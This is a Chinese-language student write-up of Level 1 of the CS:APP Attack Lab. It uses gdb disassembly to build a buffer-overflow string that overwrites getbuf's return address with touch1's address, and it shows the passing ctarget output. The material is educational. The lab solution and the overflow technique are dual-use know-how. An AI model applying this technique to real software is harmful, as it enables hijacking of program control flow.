# Attack Lab

## 介绍

对2个有不同安全漏洞的程序进行5次攻击，完成后你将会收货：

- 学会针对缓冲区溢出漏洞进行攻击。
- 学会如何将程序写的更加安全，了解操作系统和编译的特征使程序出现更少的漏洞。
- 对x86-64机器代码的堆栈和参数传递有更深的理解。
- 对x86-64机器指令解码有更深的理解。
- 对gdb工具的熟练使用。

[实验帮助文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## Part I: Code Injection Attacks

前三个阶段利用**漏洞利用**字符串攻击`CTarget`。

### Level1

阶段1不需要代码注入，相反使用**漏洞利用**字符串就可以重定向程序执行另一现有程序。

`getbuf`函数在`CTarget`中被`test`函数被调用。

![](https://s3.ax1x.com/2021/01/02/rzfeat.png)

`getbuf`函数返回后会接着执行第5句代码，现在我们想改变这个行为。

![](https://s3.ax1x.com/2021/01/02/rzfaGT.png)

你的任务是改变程序执行方向，在`getbuf`函数返回后执行`touch1`函数。请注意，您的**漏洞利用**字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为`touch1`会导致程序直接退出。

思路是我们将`touch1`的起始地址的字节序列转为字符串后复写在返回地址在堆栈的位置。

首先我们使用反汇编查看一下`getbuf`和`touch1`函数。

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

字符串的地址是`%rsp-0x28`，`getbuf`函数的返回地址是在`%rsp`。我们只需将`touch1`的地址`0x4017c0`写在返回地址即可。

构造字符串字节序列。

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x28的空间
c0 17 40 00 00 00 00 00 # touch1函数的地址 / retq的返回地址
```

注意字节排列需要还与机器的**大小端**有关。我这里使用的机器是小端模式（数据的高字节保存在内存的高地址中）。

我们再使用`hex2raw`工具将字节序列转为字符串。

```bash
./hex2raw < attack1.txt > attackraw1.txt
```

接着拿我们得到的字符串去做检测。

```bash
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw1.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

